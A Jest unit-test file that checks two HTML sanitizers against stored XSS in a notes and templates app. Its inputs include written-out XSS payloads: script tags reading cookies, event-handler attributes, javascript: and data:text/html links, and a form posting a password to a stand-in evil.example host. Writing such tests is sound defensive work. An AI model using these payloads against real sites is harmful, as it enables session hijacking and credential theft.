/**
 * Stored-XSS boundary for rich text and templates - pure unit tests.
 *
 * Note bodies and template HTML are authored in a WYSIWYG editor, but the editor
 * is not the boundary: a caller can POST straight to the API. Whatever these two
 * functions return is what gets written to the database, and it is later
 * rendered into other members' browsers - templates specifically into
 * same-origin blob iframes and popup windows, where an injected script runs with
 * the viewing member's session.
 *
 * The allow-lists are hand-maintained and have already been widened several
 * times for editor features (checklists, task items, positioned template
 * layout). Each widening is a chance to let something executable back in, so
 * both halves are asserted: nothing that can execute survives, and the
 * formatting the editors actually produce is not quietly stripped (which shows
 * up as a member's saved note losing its content on reload).
 *
 *   __TEST_TOKEN__=offline npx jest tests/shared/htmlSanitizer.test.ts
 */

const { sanitizeRichText, sanitizeTemplateHtml } = require('../../src/shared/utils/htmlSanitizer');

const SANITIZERS: Array<[string, (html: unknown) => string]> = [
  ['sanitizeRichText', sanitizeRichText],
  ['sanitizeTemplateHtml', sanitizeTemplateHtml],
];

describe.each(SANITIZERS)('%s: nothing executable survives', (_name, sanitize) => {
  test('a script tag is removed along with its contents', () => {
    // Dropping only the tag would leave the payload behind as loose text, which
    // re-executes the moment anything re-wraps it.
    const out = sanitize('<p>before</p><script>alert(document.cookie)</script><p>after</p>');
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toContain('alert(document.cookie)');
    expect(out).toContain('before');
    expect(out).toContain('after');
  });

  test.each([
    '<img src=x onerror="alert(1)">',
    '<div onclick="alert(1)">click</div>',
    '<p onmouseover="alert(1)">hover</p>',
    '<body onload="alert(1)">x</body>',
    '<a href="#" onfocus="alert(1)" autofocus>x</a>',
  ])('event handler attributes are stripped from %s', (html) => {
    const out = sanitize(html);
    expect(out).not.toMatch(/on[a-z]+\s*=/i);
    expect(out).not.toContain('alert(1)');
  });

  test.each([
    '<a href="javascript:alert(1)">click me</a>',
    '<a href="JaVaScRiPt:alert(1)">click me</a>',
    '<a href="vbscript:msgbox(1)">click me</a>',
    '<a href="data:text/html,<script>alert(1)</script>">click me</a>',
  ])('a dangerous link scheme is dropped from %s', (html) => {
    const out = sanitize(html);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/vbscript:/i);
    expect(out).not.toMatch(/data:text\/html/i);
  });

  test.each(['iframe', 'object', 'noscript', 'textarea'])(
    'a <%s> is removed with its contents',
    (tag) => {
      const out = sanitize(`<${tag} src="https://evil.example/x">payload</${tag}>`);
      expect(out).not.toContain(`<${tag}`);
      expect(out).not.toContain('payload');
    },
  );

  test('an <embed> is removed', () => {
    // Listed separately because `embed` is a void element: the parser never
    // treats anything as being inside it, so only the tag itself can be dropped.
    const out = sanitize('<embed src="https://evil.example/x">');
    expect(out).not.toContain('<embed');
    expect(out).not.toContain('evil.example');
  });

  test('a <style> block cannot smuggle in css', () => {
    // Allowed as an inline attribute only. As an element it can carry @import
    // and, historically, expression() payloads.
    const out = sanitize('<style>@import url(https://evil.example/x.css);</style><p>hi</p>');
    expect(out).not.toContain('<style');
    expect(out).not.toContain('@import');
    expect(out).toContain('hi');
  });

  test('a form is not a formatting element', () => {
    const out = sanitize('<form action="https://evil.example/steal"><input name="pw"></form>');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('evil.example');
  });

  test('a non-string is emptied rather than handed back untouched', () => {
    // A sanitizer that returns its input on an unexpected type is a sanitizer
    // that can be bypassed by sending the wrong type.
    for (const value of [null, undefined, 0, 42, {}, [], true, { toString: () => '<script>x</script>' }]) {
      expect(sanitize(value)).toBe('');
    }
    expect(sanitize('')).toBe('');
  });
});

describe('sanitizeRichText keeps what the note editor produces', () => {
  test('headings, lists, tables and inline marks survive', () => {
    const html = '<h1>Heading</h1><h2>Sub</h2><p><strong>bold</strong> <em>it</em> '
      + '<u>u</u> <s>s</s> <mark>m</mark> <sup>1</sup></p>'
      + '<ul><li>one</li></ul><ol><li>two</li></ol>'
      + '<table><thead><tr><th colspan="2">H</th></tr></thead>'
      + '<tbody><tr><td rowspan="2">C</td></tr></tbody></table>';
    const out = sanitizeRichText(html);

    for (const fragment of ['<h1>', '<h2>', '<strong>', '<em>', '<u>', '<s>', '<mark>',
      '<sup>', '<ul>', '<ol>', '<li>', '<table>', '<thead>', '<th colspan="2">', '<td rowspan="2">']) {
      expect({ fragment, kept: out.includes(fragment) }).toEqual({ fragment, kept: true });
    }
  });

  test('a checklist keeps the attributes TipTap needs to parse it back', () => {
    // Without data-type/data-checked and the input element, a saved checklist
    // silently reloads as a plain bulleted list and loses its checked state.
    const html = '<ul data-type="taskList"><li data-type="taskItem" data-checked="true">'
      + '<label><input type="checkbox" checked></label><div><p>done</p></div></li></ul>';
    const out = sanitizeRichText(html);

    expect(out).toContain('data-type="taskList"');
    expect(out).toContain('data-checked="true"');
    expect(out).toContain('<input');
    expect(out).toContain('done');
  });

  test('an allowed <input> is forced to a checkbox', () => {
    // `input` exists in the allow-list only to carry a checklist checkbox.
    // `type="image"` would give it a src, and with it an onerror surface.
    const out = sanitizeRichText('<input type="image" src="x" alt="y">');
    expect(out).toContain('type="checkbox"');
    expect(out).not.toContain('type="image"');
  });

  test('safe link and image schemes still work', () => {
    expect(sanitizeRichText('<a href="https://example.com">x</a>')).toContain('https://example.com');
    expect(sanitizeRichText('<a href="mailto:a@b.com">x</a>')).toContain('mailto:a@b.com');
    expect(sanitizeRichText('<img src="https://cdn.example/a.png">')).toContain('https://cdn.example/a.png');
    // Inline base64 images cannot execute and are what a pasted screenshot is.
    expect(sanitizeRichText('<img src="data:image/png;base64,AAAA">')).toContain('data:image/png;base64');
  });

  test('inline style and class are preserved', () => {
    const out = sanitizeRichText('<p style="text-align:center" class="lead">x</p>');
    expect(out).toContain('style="text-align:center"');
    expect(out).toContain('class="lead"');
  });
});

describe('sanitizeTemplateHtml keeps what the template editor produces', () => {
  test('positioned layout markup and the data-* family survive', () => {
    // The fill, reflow, export and asset-normalization passes all read these.
    // Stripping any of them corrupts an existing template on its next save.
    const html = '<div class="pdf-page" style="position:absolute;top:10px" '
      + 'data-page-index="0" data-flow-id="f1" data-template-object-image="1" '
      + 'data-template-asset-id="a1" id="p1" lang="en" dir="ltr">x</div>';
    const out = sanitizeTemplateHtml(html);

    for (const fragment of ['class="pdf-page"', 'position:absolute', 'data-page-index="0"',
      'data-flow-id="f1"', 'data-template-object-image="1"', 'data-template-asset-id="a1"',
      'id="p1"', 'lang="en"', 'dir="ltr"']) {
      expect({ fragment, kept: out.includes(fragment) }).toEqual({ fragment, kept: true });
    }
  });

  test('the structural blocks templates use survive', () => {
    const out = sanitizeTemplateHtml(
      '<h3>a</h3><h6>b</h6><figure><figcaption>c</figcaption></figure>'
      + '<address>d</address><pre><code>e</code></pre><small>f</small><time>g</time>',
    );
    for (const tag of ['h3', 'h6', 'figure', 'figcaption', 'address', 'pre', 'code', 'small', 'time']) {
      expect({ tag, kept: out.includes(`<${tag}`) }).toEqual({ tag, kept: true });
    }
  });

  test('an image data: url must be an image', () => {
    // The one place a data: url is allowed. Restricting it to data:image/*
    // stops a data:text/html payload riding in on a src attribute.
    const evil = sanitizeTemplateHtml('<img src="data:text/html;base64,PHNjcmlwdD4=" alt="x">');
    expect(evil).not.toContain('data:text/html');
    // The element itself is kept (only its src is dropped) so the layout that
    // positions it is not disturbed.
    expect(evil).toContain('<img');

    expect(sanitizeTemplateHtml('<img src="data:image/png;base64,AAAA">'))
      .toContain('data:image/png;base64');
  });

  test('a protocol-relative url is not treated as a safe scheme', () => {
    expect(sanitizeTemplateHtml('<a href="//evil.example/x">x</a>')).not.toContain('//evil.example');
  });

  test('a data-* attribute cannot carry an event handler in disguise', () => {
    // data-* is allowed wholesale on every element, so the guarantee being
    // relied on is that `on*` is not reachable through it.
    const out = sanitizeTemplateHtml('<div data-onclick="alert(1)" onclick="alert(1)">x</div>');
    expect(out).toContain('data-onclick');   // inert, and something may read it
    expect(out).not.toMatch(/\sonclick=/i);  // live handler, never
  });
});

describe('the two sanitizers agree on the dangerous cases', () => {
  test.each([
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<a href="javascript:alert(1)">x</a>',
    '<iframe src="https://evil.example"></iframe>',
  ])('%s is neutralized identically by both', (html) => {
    // Templates allow strictly more formatting than notes. That widening must
    // never have widened the executable surface too.
    const rich = sanitizeRichText(html);
    const template = sanitizeTemplateHtml(html);
    for (const out of [rich, template]) {
      expect(out).not.toMatch(/<script|<iframe|javascript:|onerror/i);
    }
  });
});

// A spec file exports nothing; the empty export marks it as a MODULE so
// its top-level bindings stay file-scoped rather than colliding across specs.
export {};
